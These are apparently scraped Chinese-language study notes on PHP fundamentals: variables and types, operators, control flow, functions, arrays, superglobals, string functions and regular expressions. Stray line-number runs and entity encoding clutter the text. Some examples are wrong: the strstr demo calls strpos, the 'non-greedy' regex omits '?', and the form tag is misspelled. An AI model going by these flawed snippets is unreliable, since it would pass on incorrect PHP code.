变量名称可以是字母、数字、下划线，但不能以数字开头4、PHP中有一些关键字，其他编程语言中不能使用他们中的任何一个做为常量、函数名或类名。 但是可以在PHP中做为变量名称使用，不推荐使用关键字，5、可变变量(了解) 可变变量就是不是固定的数据，可以随时改变的 $result &#x3D; &quot;handsome&quot;; $$result &#x3D; &quot;英俊&quot;; echo $handsome;6、引用赋值 引用赋值大白话讲就是给变量起别名 $a &#x3D; 10; &#x2F;&#x2F; $b &#x3D; $a; &#x2F;&#x2F; 这种操作修改$b并不会影响另外一个值 $b &#x3D; &amp;$a; &#x2F;&#x2F; 修改任意一方都会影响 $b &#x3D; 20; echo $a;&#x2F;&#x2F; 应该可以理解为，没起别名之前$a和$b是单独的，起完别名之后$b&#x3D;&amp;$b这样他们两个就变成了要给整体 修改任意一方就会改变。 三、变量类型123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117概述： 变量类型就是指保存在该变量中的数据类型 具有相同类型的类型才能彼此操作 在强类型的语言中例如:C语言、java等，变量需要先指定类型，然后才能存储对应指定的数据 但是PHP是一种弱类型的语言，和其他语言不同的是，变量或者常量的数据类型由程序上下文决定 不需要示先声明类型 1、变量类型 使用var_dump(变量名) &#x2F;&#x2F; 可以输出变量的类型 $a &#x3D; true; var_dump($a); &#x2F;&#x2F; 返回true 1) bool(布尔型) 布尔型只有两个，true和false，真或假 以下值认为是false，其他值被认为是true ①布尔值false ②0 ③浮点数0.0 ④空白字符串和字符串0 ⑤没有成员组的数组 ⑥NULL 2) int(整形) 存储整数 3) float(浮点型) 存储小数 4) str(字符型) 使用单引号，双引号，定界符就是字符 PHP也是可以使用\\反斜杠进行转义 单引号: 在单引号中不管放什么变量都不会查找 &#x2F;&#x2F; 他不管你单引号中有什么东西，都会给你直接输出 $a &#x3D; true; $b &#x3D; &#39;hand $a some&#39;; echo $b; &#x2F;&#x2F;输出结果是: hand $a some 双引号: 在双引号中，如果你放入其他变量他就会进行查找 &#x2F;&#x2F; 输出结果会报错，因为双引号中有$a变量，PHP会进行查找， 查找之后发现变量a后面还跟着some，但是却没有$asome这个变量所以报错 $a &#x3D; true; $b &#x3D; &quot;hand$asome&quot;; echo $b; 正确语法: &#x2F;&#x2F; 这里应该使用花括号将其括起来，跟后面字符分隔开，表示花括号内的是变量 $a &#x3D; true; $b &#x3D; &quot;hand&#123;$a&#125;some&quot;; echo $b; &#x2F;&#x2F;输出结果是:hand1some,true转换成数字是1 定界符: &lt;&lt;&lt;之后提供一个标识符开始，然后是 字符串的内容 最后是同样的标识符结束 注意:标识符之后必须接，不可以用其他的任何字符。 语法: $a &#x3D; &lt;&lt;&lt;handsome 我现在是字符串吗？ handsome; var_dump($a); &#x2F;&#x2F; 如果其中也要加入其他变量的话，也需要把要加入的变量用花括号括起来 &#x2F;&#x2F; 如果不加花括号会报错，和双引号一样，而在定界符中可以包含单引号和双引号 语法: $b &#x3D; &quot;一个&quot;; $a &#x3D; &lt;&lt;&lt;handsome &#39;&#39;&#39;我现&#39;在&quot;是&#123;$b&#125;字符&quot;串&quot;&quot;吗？ handsome; &#x2F;&#x2F; 结尾的标识符必须和开头定界符后面跟的标识符相同 var_dump($a); 5) array(数组) 数组是PHP中一种重要的符合数据类型。 之前的类型只能存入一个数据，而数组可以存放多个数据，并且可以存入任何类型的数据。 跳过，后面课程讲解 6) object(对象) 跳过，后面课程讲解 7)resourse(自愿) 跳过，后面课程讲解 8)NULL NULL表示空 &#x2F;&#x2F; a变量没有赋值，也就相当于没有这个变量，返回NULL &#x2F;&#x2F; 可以将a删除，然后直接打印a的数据类型，结果一样为NULL $a; var_dump($a); 2、变量类型转换 1) 自动类型转换 布尔值: 布尔值参与运算时，true转换为整型为 1 ， false 为 0 null值参与运算时，null转换为整形0 int型和float数据参与运算时，先把int转换为float类型后在进行运算 有字符串和数字型(int或者float)参与运算时的情况 - 这些都是程序运行中不太可控的部分所以在编写代码时最好不要涉及 2) 强制类型转换 在要转换的变量之前加上括号括起来目标类型 语法： $a &#x3D; &quot;test&quot;; $b &#x3D; (int)$a; var_dump($b); &#x2F;&#x2F; 转换结果是 int(0) (int) (bool) (float) (string) (array) (object) 转变并不会改变被转换变量本身的类型 3)变量类型测试函数 语法： $a &#x3D; 10; var_dump(is_int($a)); is_bool() &#x2F;&#x2F; 检测一个变量是否为布尔值 is_int() &#x2F;&#x2F; 检测一个变量是否为整数 is_array() &#x2F;&#x2F; 检测一个变量是否为数组 等等.... 四、常量12345678910111213141516171819202122232425262728291、概念 常量也是用于临时(只有在我们的程序的运行过程中才存在)用于存储数据的容器2、定义和使用 语法： &#x2F;&#x2F; 定义常量名称的时候需要用引号将常量名称括起来，单引双引都可以 define(&#39;常量名称&#39;,常量值); &#x2F;&#x2F; 检查是否定义了某个常量 defined()函数 常量的命名与变量类似，也遵循PHP标识符的名称规则，按照惯例常量名称总是大写的3、常量变量的区别 1)常量只能用define()函数定义，不能通过赋值语句 2)常量只能用define()定义，不能通过赋值语句 3)常量可以不用理会变量范围的规则在任何地方定义和使用 4)常量一旦被定义就不能被重新定义或者取消定义 5)常量的值只能是bool，int，float，string类型4、预定义常量 预定义常量说白了就是我们的PHP内核已经帮我们定义好了的常量 其中有的预定义常量是以__两个下划线开头的，这些预定义常量我们又叫他魔术常量 代码所在的位置不同他的值也是不同的，所以他叫 魔术常量 这些特殊的常量是不区分大小写的，还是一样，建议最好常量使用大写，这样不容易混淆 而自己定义的常量是严格区分大小写的 常量名 常量值 __FILE__ 当前的文件位置 __LINE__ 当前所在行数 __FUNCTION__ 当前的函数名 __CLASS__ 当前的类名 __METHOD__ 当前对象的方法名 等等.... 五、运算符123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869运算符对一个或者多个操作数(变量或者数值)执行某种运算符的符号，也称操作符~1、算术运算符 + 两边数值相加 - 两边数值相减，也可以取反，取反的时候并不会影响到被取反变量本身的值 * 两边数值相乘 &#x2F; 两边数值相除 % 两边数值相除，并求余 ++ 自加1 -- 自减1 注意:自增自减是对变量而言的2、字符串运算符 PHP中的字符串运算符只有一个英文的句号 &quot; . &quot; 也叫连接运算符 $a &#x3D; &quot;孙悟空&quot;; $b &#x3D; &quot;在水帘洞居住&quot;; $c &#x3D; $a.$b; echo $c; &#x2F;&#x2F; 输出结果是:孙悟空在水帘洞居住3、赋值运算符 二元运算符 左边的操作数必须是变量，右边可以是表达式，也可以是一个值，一个变量等等 作用:将右边表达式的值赋给左边变量 &#x3D; +&#x3D; -&#x3D; *&#x3D; &#x2F;&#x3D; %&#x3D; .&#x3D;4、比较运算符 对操作数进行比较 如果比较结果满足于比较运算符要求，返会结果true，否则false &#x3D;&#x3D; 等于 &#x3D;&#x3D;&#x3D; 全等于(值要相等，类型也要相等) !&#x3D; 不等于 &lt;&gt; 不等于 !&#x3D;&#x3D; 不全等于 &lt;&#x3D; 小于等于 &lt; 小于 &gt;&#x3D; 大于等于 &gt; 大于5、逻辑运算符概念: 对表达式进行逻辑运算，运算出的结果是布尔类型 要求: 参与逻辑运算的表达式的值是布尔类型的值，如果不是布尔类型的值会被自动转换成布尔类型的值 逻辑与 and 或者 &amp;&amp; &#x2F;&#x2F;运算结果两边都为true结果为true，否则为false 逻辑或 or 或者 || &#x2F;&#x2F;运算结果有一边为true结果为true 逻辑异或 xor &#x2F;&#x2F;只有两边值不一样的时候结果为true，如果两边值一样就是false 逻辑非 ！ &#x2F;&#x2F;将原来的值否定，如果是true返回false，如果是false返回true6、其他运算符 1) ? : &#x2F;&#x2F;三元运算符 格式: 表达式1 ? 表达式2 : 表达式3; 如果表达式1的值为true，那么就执行表达式2，否则执行表达式3 2) &#96;&#96; 可以吧系统的命令放到里面执行！ 基本用不到，涉及到跨平台 3) @ 屏蔽表达式发生的错误 echo @$a; 4)&#x3D;&gt; 5)-&gt; 6)instanceot7、运算符优先级 谁的优先级高先算谁，如果实在不知道谁的优先级高，使用()括号将其括起来 一、流程控制12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455对PHP程序执行的过程进行控制PHP有哪些手段对程序过程进行控制一、顺序执行 顺序执行非常简单就是从上往下执行即可二、分支执行 分支执行可以根据条件是否满足来选择执行某些代码，PHP的分支执行主要通过两种语句(if,switch)来实现 1、if语句 1) 单向条件 if(表达式)语句; 格式: if($result &gt;&#x3D; $number)&#123; echo &quot;恭喜你考试成功&quot;; &#125; 2)双向条件 if&#123; 语句... &#125; else&#123; 语句... &#125; 3)多向条件 if(表达式)&#123; 语句... &#125; elseif&#123; 语句块... &#125; elseif&#123; 语句... &#125; else&#123; 语句块... &#125; 2、switch语句 格式: switch(表达式)&#123; case 值 1: 语句块1 break case 值 2: 语句块2 break ...... default: 语句块n &#125; 注意点: 1)表达式的值最好是整形或者字符串！ 2)不要忘记break语句！来跳出switch语句！每个case语句后面都加上break 3)如果某个case语句后面并没有接语句块，那么就说明这个语句块的内容是同下的 二、、循环语句1234567891011121314151617181920212223重复执行某些操作whiledo...whileforwhile循环 while(表达式)&#123; 语句... 再自加一 &#125;do...while循环 do&#123; 语句... &#125;while(表达式)for循环 for(表达式1,表达式2,表达式3)&#123; 语句... &#125; 表达式1:会放一些初始化的语句，$a&#x3D;0, 表达式2:循环次数，一般用比较操作符来判断操作次数，a&lt;&#x3D;5 表达式3:自增1，每次循环完毕都自身加1, a++ 特殊的流程控制语句1234561、break语句 退出循环 break 后面可以接上数字表示跳出几层循环，break 2 表示跳出两层循环2、continue语句 跳过本次循环3、exit()语句 结束整个程序的执行 三、函数1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859使用函数的优点 提高软件的可维护性 提高软件的开发效率 提高软件的重用性 函数的创建和调用 &#x2F;&#x2F;创建一个fun函数，函数内部输出内容Hello function fun()&#123; echo &#39;Hello&#39;; &#125; &#x2F;&#x2F;调用函数，函数名后面需要加括号 fun(); 一、自定义函数 1、函数的定义 function 函数名([参数1，参数2,....])&#123; return 表达式;&#x2F;&#x2F;可以从函数中返回一个值，也可以不返回 &#125; 2、函数的调用 不管是自己定义的函数还是系统提供的函数，如果函数不被调用就不会执行！ 调用：函数被调用后开始执行函数体中代码，执行的过程是相对独立的，执行完毕返回调用的位置继 续向下执行 3、函数的参数 形式参数由零个、一个或者多个变量组成。 实际参数由零个、一个或者多个参数组成，每个参数是一个表达式，用逗号分隔 4、函数的返回值 函数的返回值是是将函数执行后的结果返回给调用者 默认如果不写返回则函数的返回值为NULL 二、变量的范围 1、局部变量 function fun()&#123; echo $i; $a&#x3D;1; &#x2F;&#x2F;局部变量 &#125; 局部变量也称为内部变量，局部变量实在函数内定义的，作用域仅限于函数的内部。 2、全局变量 $i&#x3D;10; &#x2F;&#x2F;全局变量 function fun()&#123; global $i; &#x2F;&#x2F;声明$i为全局变量，然后在这个函数内部就可以使用$i echo $i; $a&#x3D;1; &#125; fun(); 全局变量也被称为外部变量，在函数的外部定义的，作用域从定义处到程序文件的末尾 在PHP函数中无法直接使用全局变量，如需使用必须使用global声明变量 3、静态变量 function fun()&#123; static $a&#x3D;1; &#x2F;&#x2F;静态变量$a,初始化静态变量，仅在第一次调用的时候执行 echo ++$a; &#x2F;&#x2F;当第二次执行这个函数的时候$a这个变量依然存在并且里面的值也依然 存在 &#125; fun(); echo &#39;&lt;br &#x2F;&gt;&#39;; fun(); 静态变量的是值在函数内部定义的时候static关键字来定义变量特点：函数执行完毕之后变量 不会立即消失，再次调用函数的时候，静态变量保存的值依然存在，并且仅在第一次执行 函数的时候会初始化值 参数传递1234567891011121314151617181920212223242526272829303132333435363738394041一、函数的传递 1、案值传递参数 默认的，我们在传递参数的时候默认使用的就是这个方式！ 对形式参数的操作，根本不会影响到实际参数的值两者相当于没有联系 function fun($a)&#123; echo ++$a; &#125; $i &#x3D; 10; fun($i); &#x2F;&#x2F; 打印结果 11 echo &#39;&lt;br &#x2F;&gt;&#39;,$i; &#x2F;&#x2F; 打印结果10 2、按引用传递参数 按引用传递参数，相当于形式参数和实际参数是同一个值，只是名字不一样，相当于起了个别名 对于形式参数的操作会直接影响到实际参数 function fun(&amp;$a)&#123; echo ++$a; &#125; $i &#x3D; 10; fun($i); &#x2F;&#x2F; 打印结果11 echo &#39;&lt;br &#x2F;&gt;&#39;, $i; &#x2F;&#x2F; 打印结果11 3、函数的默认参数 可以给形式参数设置默认值，设置发方法直接赋值即可 给形式参数加默认值的时候是从右往左加，右边的必须有，才能给左边的加， 右边必须加的值就是默认值 &#x2F;&#x2F; $b&#x3D;10就是默认值 function fun($a,$b&#x3D;10)&#123; echo $a+$b; &#125; fun(20); 4、可变长度参数列表 PHP提供了三个函数，可以直接使用 func_get_args(); func_get_arg(); func_num_args(); 这三个函数可以使用在自定义函数内部，能够给我们返回一些关于参数的信息 function test()&#123; &#x2F;&#x2F; var_dump(func_get_args()); &#x2F;&#x2F;做一些其他操作 &#x2F;&#x2F; var_dump(func_get_arg(1)); &#x2F;&#x2F;调用这个函数的时候可以传入一个值表示获取第 几个实际参数(从0开始)，感觉类似索引 var_dump(func_num_args()); &#x2F;&#x2F;返回传入所在自定义函数的参数的个数， 类似于 数据库的，length &#125; test(2313,135165,165165,&#39;uiashdinsauiod&#39;); &#x2F;&#x2F; 自定义函数参数个数 四、可变函数123456就是把一个函数赋值给变量function test()&#123; echo &#39;我是TEST函数&#39;;&#125;$a &#x3D; &#39;test&#39;; &#x2F;&#x2F; $a &#x3D; test();echo $a(); &#x2F;&#x2F; echo a; &#x2F;&#x2F;这种也能输出，但不知道后续有什么问题 五、递归函数12345678910111213141516递归函数即在函数内部自己调用自己的函数.递归函数: 1)函数在被调用的执行过程中会在内存里面分配空间用于存储临时数据，函数在执行过程中默认之间 没有任何联系，除了(静态变量，接引用传，全局变量),里面的变量默认都是局部变量 2)递归函数，在函数的内部需要有适时结束函数运行的条件在使用递归的时候避免死循环function fun($i)&#123; echo $i.&#39;&amp;nbsp;&#39;; if($i&gt;0)&#123; fun($i-1); &#x2F;&#x2F; 自己内部调用自己，即 递归函数 &#125;else&#123; echo &#39;&lt;- - -&gt;&#39;; &#125; echo $i.&#39;&amp;nbsp;&#39;; &#125; &#x2F;&#x2F; fun(3);&#x2F;&#x2F;返回结果是 3 2 1 0 &lt;- - -&gt;0 1 2 3 六、内置函数12PHP提供给我们许多现成的函数或者结构，我们可以在实际的开发中直接使用使用函数使用来完成功能的，说白了，有这样的需求，才会找对应的函数！ 理解数组和创建数组123456789思路 数组概论: 可以把这些单个数据都联合起来(打包、捆绑)起来，作为一个整体 这个数据类型就是 数组 他是一种 复合数据类型 数组类型： 索引值:将相当于给里面的每一个数据起个名字 名字如果取得是整型：那么这个数组就是索引数组 如果名字是字符串类：那么这个数组就是 关联数组 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263数组创建:PHP中创建数组非常灵活，与其他许多编程语言不同的是PHP不需要在创建数组时，指定数组的大小(指定数组里面可以放几个数据)，甚至不需要在使用数组之前声明，也可以在同一个数组中存放任何了型的数据。 · 直接为元素赋值即可创建数组 · 使用array()语言结构创建数组1、直接为数组元素赋值创建数组 $变量名[索引值]&#x3D;数据内容; 索引值可以是整数也可以是字符串，也可以不写(默认为索引数组) 如果省略索引值不写那么默认索引值就是整数，并且从0开始，依次向上 &#x2F;&#x2F; $student[索引值]&#x3D;数据值; 不加索引值从0开始依次向上 $student[0]&#x3D;10; $student[]&#x3D;10; &#x2F;&#x2F; 0 $student[1]&#x3D;&#39;孙悟空&#39;; $student[]&#x3D;&#39;孙悟空&#39;; &#x2F;&#x2F; 1 $student[2]&#x3D;true; $student[]&#x3D;true; &#x2F;&#x2F; 2 $student[3]&#x3D;60.5; $student[]&#x3D;60.5; &#x2F;&#x2F; 3 &#x2F;&#x2F; 使用echo并不能输出数组，而是需要使用print_r()函数来输出打印数组 &#x2F;&#x2F;echo $student; print_r($student); &#x2F;&#x2F; 使用var_dump也可以输出，并且打印数据类型 &#x2F;&#x2F;var_dump($student); 2、使用array()结构创建数组 $变量名&#x3D;array(key1&#x3D;&gt;value1......); 创建数组 $student&#x3D;array( | &#x2F;&#x2F;可以不写索引值直接输出 &#39;sum&#39;&#x3D;&gt;10, | $student&#x3D;array(10,&#39;孙悟空&#39;,true,60.5) &#39;name&#39;&#x3D;&gt;&#39;孙悟空&#39;, | &#39;sex&#39;&#x3D;&gt;true, | &#39;grade&#39;&#x3D;&gt;60.5 | ); | &#x2F;&#x2F;print_r($student);| var_dump($student); | 使用数组里面的具体数据数组变量名称[索引值]$student&#x3D;array(&#39;sum&#39;&#x3D;&gt;10,&#39;name&#39;&#x3D;&gt;&#39;孙悟空&#39;,&#39;sex&#39;&#x3D;&gt;true,&#39;grade&#39;&#x3D;&gt;60.5);echo $student[&#39;name&#39;]; &#x2F;&#x2F; 数组[索引值]，输出结果&#39;孙悟空&#39;数组中还可以放数组二维数组$student&#x3D;array( array(1,&#39;孙悟空&#39;,true,60.5), array(2,&#39;唐玄奘&#39;,true,100), array(3,&#39;沙和尚&#39;,true,80.5), array(4,&#39;猪八戒&#39;,true,0),);print_r($student);二维数组如果需要调用其中的一个值$student&#x3D;array( array(1,&#39;孙悟空&#39;,true,60.5), array(2,&#39;唐玄奘&#39;,true,100), array(3,&#39;沙和尚&#39;,true,80.5), array(4,&#39;猪八戒&#39;,true,0),);&#x2F;&#x2F; 0表示从第0个开始也就是从孙悟空那个数组开始，&#x2F;&#x2F; 3表示第0个数组里面索引是3的值echo $student[0][3]; 1234567891011121314151617181920212223242526272829数组的遍历 遍历:每个都经历一遍 1) for循环 用的少，因为有缺陷，不能用于关联数组进行遍历 2) foreach语句来实现遍历数组的目的，比较常用，专门用来遍历数组的 foreach(数组变量名 as 变量1)&#123; 每次循环执行的语句 变量1代表当前正在经历的数据 &#125;不管是关联数组还是一维数组二维数组，都可以输出 实例: $arr1 &#x3D; array( &#39;name&#39;&#x3D;&gt;&#39;孙悟空&#39;, &#39;num&#39;&#x3D;&gt;10 ); foreach($arr1 as $value)&#123; echo $value; &#125; 如果你想要的知道索引值如果想要知道索引值必须加&#x3D;&gt;符号，前面的变量是索引值，后面的变量是执行的数据 $arr1 &#x3D; array( &#39;name&#39;&#x3D;&gt;&#39;孙悟空&#39;, &#39;num&#39;&#x3D;&gt;10 ); foreach($arr1 as $w&#x3D;&gt;$value)&#123; echo $w,$value.&#39;&lt;br &#x2F;&gt;&#39;; &#125; 123456789101112131415161718192021222324252627282930313233343536预定义超全局数组变量 已经定义好了(存在)的变量(存放的数据的类型是数组 ) 超全局:超级全局变量，作用域(有效区域)全局的，并不需要global来定义 传递数据(提供数据)给服务器端主要的两种方式 1.get方式 比如: &#x2F;&#x2F;其中&amp;表示后面可以追加多个值 ?id&#x3D;10&amp;name&#x3D;SunWuKong http:&#x2F;&#x2F;localhost&#x2F;demo2&#x2F;1.php?参数名&#x3D;参数值 在服务器端(请求的PHP文件这边)可以通过$_GET来获取到 $_GET就是在服务端的参数名字，而在URL中的索引值对应的数据就是参数值 在服务端使用$_GET: var_dump($_GET); $_GET优缺点 优点: 实行方便，直接在URL中使用 缺点: 正因为实行方便，直接写在URL中，所以这反而不安全，而且在URL中只能用英文 2.post方式 $_POST &lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;title&gt;预定义全局变量&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;from method&#x3D;&quot;post&quot;&gt; 姓名:&lt;input type&#x3D;&quot;text&quot; name&#x3D;&#39;username&#39; &#x2F;&gt;&lt;br &#x2F;&gt; 性别:&lt;input type&#x3D;&quot;text&quot; name&#x3D;&#39;sex&#39; &#x2F;&gt;&lt;br &#x2F;&gt; &lt;&#x2F;from&gt; &lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455处理数组的相关函数这只是其中一部分，通过学习下面一部分，来了解如何使用处理数组的相关函数 1) array_count_values &#x2F;&#x2F; 统计数组中所有的值出现的次数 array array_count_values(array $input) 实例: $array &#x3D; array(1,&quot;hello&quot;,1,&quot;world&quot;,&quot;hello&quot;); print_r(array_count_values ($array)); print_r($array) &#x2F;&#x2F; 原来的数组不会受到任何影响 结果: &#x2F;&#x2F; 1 在数组中出现了2次，hello出现了2 次，world出现了1次 Array ( [1]&#x3D;&gt;2 [hello]&#x3D;&gt;2 [world]&#x3D;&gt;1 ) 2) array_key_exists &#x2F;&#x2F; 查看给定的键值或索引是否存在与数组中 实例: $search_array &#x3D; array(&#39;first&#39; &#x3D;&gt; 1 , &#39;second&#39; &#x3D;&gt; 4); if(array_key_exists(&#39;first&#39;,$search_array))&#123; echo &quot;The &#39;first&#39; element is in the array&quot;; &#125; 结果: The &#39;first&#39; element is in the array 3) array_search &#x2F;&#x2F;在数组中搜索给定的值，如果成功则返回相应的键名 $array &#x3D; array(0 &#x3D;&gt; &#39;blue&#39;, 1 &#x3D;&gt; &#39;red&#39;,2 &#x3D;&gt;&#39;green&#39;,3&#x3D;&gt;&#39;red&#39;,4&#x3D;&gt;15); &#x2F;&#x2F; 可以加入true来判断中&#39;15&#39;有没有,虽然上面有15但是类型不同,一个int一个str &#x2F;&#x2F; 如果不加true不比较类型，只比较大小是够相等，返回了键4 var_dump(array_search(&#39;15&#39;,$array,true)); &#x2F;&#x2F; key &#x3D; 2 返回false,类型不同 var_dump(array_search(&#39;red&#39;,$array)); &#x2F;&#x2F; key &#x3D; 1 4) count &#x2F;&#x2F; 计算数组中的单元数目或对象中的属性个数 &#x2F;&#x2F; $array变量中有两个值 $array &#x3D; array(0 &#x3D;&gt; &#39;blue&#39;, 1 &#x3D;&gt; &#39;red&#39;); var_dump(count($array)); &#x2F;&#x2F; 返回结果是 int(2) 5) in_array &#x2F;&#x2F; 检查数组中是否存在某个值 $os &#x3D; array(&#39;Mac&#39;,&#39;NT&#39;,&#39;Irix&#39;,&#39;Linux&#39;); var_dump(in_array(&#39;Mac&#39;,$os)); 6) list &#x2F;&#x2F; 把数组中的值赋给一些变量 list()仅能用于数字索引的数组 格式: $arr&#x3D;array(索引值); list(变量名)&#x3D;$arr; echo 变量名 ; 实例: $arr&#x3D;array(60,70,80); list($Sun,$Liu,$Zhang)&#x3D;$arr; echo $Zhang; &#x2F;&#x2F; 结果是 80 7) asort &#x2F;&#x2F; 对数组进行排序保持索引关系 $frults &#x3D; array(&quot;c&quot;&#x3D;&gt;60,&quot;a&quot;&#x3D;&gt;90,&quot;b&quot;&#x3D;&gt;30); asort($frults); print_r($frults); 直接对数组里面的数据进行排序 字符串处理123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475一、去除空格或其他字符1、trim()函数 去除空格 $str &#x3D;&#39; abc &#39;; var_dump($str); var_dump(trim($str)); 去除其他空格 $str &#x3D;&#39;aabca&#39;; var_dump($str); var_dump(trim($str,&#39;a&#39;));2、ltrim() 去除左边字符3、rtrim() 去除右边字符二、大小写转换函数1、strtoupper() 将字母大写 $a &#x3D; &#39;test&#39;; var_dump($a); var_dump(strtoupper($a));2、strtolower() 方法同上 三、字符串查找函数1、substr_count() 计算字符串出现的次数 $str&#x3D;&#39;teteastetasd&#39;; var_dump(substr_count($str,&#39;te&#39;)); &#x2F;&#x2F;可以再查找的字符串后面加上起始值和结束值2、strpos() 查找字符串首次出现的位置 $str&#x3D;&#39;teteastetasd&#39;; var_dump(strpos($str,&#39;as&#39;)); &#x2F;&#x2F;返会结果是 43、strstr() 返回字符串首次出现的位置并将后面的字符全部输出 $str&#x3D;&#39;teteastetasd&#39;; var_dump(strpos($str,&#39;as&#39;)); &#x2F;&#x2F;返回结果 astetasd四、字符串替换函数 1、str_replace 字符串替换 替换多个字符 $str&#x3D;&#39;teteastetasd&#39;; $str1&#x3D;str_replace(array(&#39;e&#39;,&#39;a&#39;,&#39;s&#39;),array(&#39;E&#39;,&#39;A&#39;,&#39;S&#39;),$str); var_dump($str1);五、与html标签相关的函数1、htmlspecialchars() $str&#x3D;&lt;&lt;&lt;START &lt;p style&#x3D;&quot;color:red;fonts-size:28px;&quot;&gt;单位确定为取得完全&lt;&#x2F;p&gt; START; echo $str; echo &quot;\\n&quot;; echo htmlspecialchars($str);2、strip_tags() 从字符串中去除HTML和PHP标记 $str&#x3D;&lt;&lt;&lt;START &lt;p style&#x3D;&quot;color:red;fonts-size:28px;&quot;&gt;单位确定为取得完全&lt;&#x2F;p&gt; START; echo $str; echo &quot;\\n&quot;; echo strip_tags($str);六、字符串截取函数1、substr() 截取函数 $str&#x3D;&#39;teaeatewfsdf&#39;; echo substr($str,1); &#x2F;&#x2F;将t给截取了七、字符串分割函数1、explode() 用其中的一个字符来分割 $str&#x3D;&#39;test,test1,test2,test3&#39;; var_dump(explode(&#39;,&#39;,$str));2、str_split() 将一个字符串转换为数组 $str &#x3D; &#39;Hello&#39;; var_dump(str_split($str)); &#x2F;&#x2F;输出结果是 数组格式 将字符中长度是3的输出，这里输出的结果就是hel lo是因为字符长度不足，输出出来的。 $str &#x3D; &#39;Hello&#39;; var_dump(str_split($str,3)); 正则表达式1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283一、正则表达式语法规则 正则表达式描述了一类字符串的特征，通过这个特征与特定的函数配合，对其他的字符串进行匹配、查找、替换及分割操作！ 这类字符串的特征是由一个或多个 1、普通字符(比如a到z)、 2、元字符(有特殊功能的字符比如*、+、?等), 组成的一个字符串！ 例如&#39;&#x2F;a&#x2F;&#39;,a就是普通字符，&#x2F;是定界符(表示正则表达式开始或结束)。 preg_match_all()&#x2F;&#x2F;按指定的正则表达式，在给定的字符串中进行搜索，匹配到复合特征的部分取出来&#x2F;&#x2F; 用正则表达式指定一个特征 $pattern&#x3D;&#39;&#x2F;test&#x2F;&#39;;&#x2F;&#x2F; 新建一个变量，里面存入字符串，上面的特种会查找当前字符串有没有相同的，有则输出 $str&#x3D;&#39;testidhiashtestewofoitest&#39;;&#x2F;&#x2F; 第一个变量就是指定得正则，第二个变量就是要查找的字符串，第三个变量是将你匹配的字符串查找出来，并且赋值给第三个变量 preg_match_all($pattern,$str,$varr); var_dump(preg_match_all($pattern,$str,$varr)); var_dump($varr);二、定界符 我们一般用正斜杠&#x2F;作为定界符的字符 除了字母、数字、和正斜线以外的字符都可以作为定界符，比如 # ! &#123;&#125; | 都可以 定界符放在正则表达式起始位置，前后一致！ 三、普通字符 比如:a-z、A-Z、0-9、双引号、单引号，他们没有特殊的含义 &#x2F;* 元字符 \\d 代表0-9之中的任意一个字符， 注意是 一个 字符，如果两个的话就不行了 \\D 匹配除了0-9之外的任意一个字符，注意是 一个 字符，如果两个的话就不行了 \\s 匹配任意一个空白字符，比如换页符、换行符、回车符、制表符、垂直制表符 \\S 匹配除了空白字符以外的任何一个字符 \\w 匹配任意一个数字或字母或下划线 \\W 匹配除数字、字母、下划线以外的任意一个字符 . 匹配除换行符以外的任意一个字符 * 匹配0次、或者1次、或多次 + 匹配1次或多次其前面的字符 ? 匹配0次或1次其前面的字符 &#123;n&#125; 表示其前面字符恰好出现n次 &#123;n,&#125; 表示前面字符出现不少于n次 &#123;n,m&#125; 表示前面字符至少出现n次，最多出现m次 ^或\\A 匹配字符串开始位置 $或者\\Z 匹配字符串的结束位置 | 匹配两个或多个模式 [] 匹配方括号中的任意一个字符 [^] 匹配除方括号中字符以外的任意一个字符 () 将括号中作为一个整体以便将其中的内容获取到 在我们的正则表达式中，可以使用圆括号来将某一段括起来，在圆括号的后面部分我们可以使用 \\\\数字 来代表圆括号部分所匹配的内容 &#x2F;* ()将括号中作为一个整体以便将其中的内容获取到 在我们的正则表达式中 可以使用圆括号来将某一段括起来，在圆括号的后面部分，我们可 以使用 \\\\数字 来代表圆括号部分所匹配到的内容 *&#x2F; $pattern&#x3D;&#39;&#x2F;t(e)st\\\\1&#x2F;&#39;;&#39;\\\\1就代表第一个圆括号部分所匹配到的内容&#39; &#x2F;&#x2F; 在()里面，匹配到什么\\\\1就要跟什么，不能和()的 $str&#x3D;&#39; teste &#39;; var_dump(preg_match_all($pattern,$str,$varr)); var_dump($varr); *&#x2F; &#x2F;&#x2F; 在搜索的时候因为你是在te和st中间插入的\\d所以只能在$str里面找te到st中间有数字的 &#x2F;&#x2F; 例如: te0-9st只要其中一个数字都可以，但是如果tes0-9t,在这个位置或者以外的位置,、 将搜索不到。 $pattern&#x3D;&#39;&#x2F;te\\dst&#x2F;&#39;; $str&#x3D;&#39;testidhtesteite1st&#39;; var_dump(preg_match_all($pattern,$str,$varr)); var_dump($varr); &#x2F;&#x2F;除了0-9之外都能匹配 $pattern&#x3D;&#39;&#x2F;te\\Dst&#x2F;&#39;; $str&#x3D;&#39;testidhteTsteite1st&#39;; var_dump(preg_match_all($pattern,$str,$varr)); var_dump($varr); 12345678910111213141516&#x2F;* .和*匹配 .*配合使用默认情况下是 贪婪匹配(尽可能多的匹配)*&#x2F;$pattern&#x3D;&#39;&#x2F;te.*st&#x2F;&#39;; $str&#x3D;&#39;testidhteTsteite1st&#39;; var_dump(preg_match_all($pattern,$str,$varr)); var_dump($varr); &#x2F;* .*后面加上一个?可以解决贪婪匹配问题，非贪婪匹配*&#x2F;$pattern&#x3D;&#39;&#x2F;te.*st&#x2F;&#39;; $str&#x3D;&#39;testidhteTsteite1st&#39;; var_dump(preg_match_all($pattern,$str,$varr)); var_dump($varr); 模式修正符123456789101112模式修正符是在正则表达式的定界符之后使用的，可以调整正则表达式的解释，扩展正则表达式在匹配、替换等操作时的某些功能，增强正则表达式的处理能力| 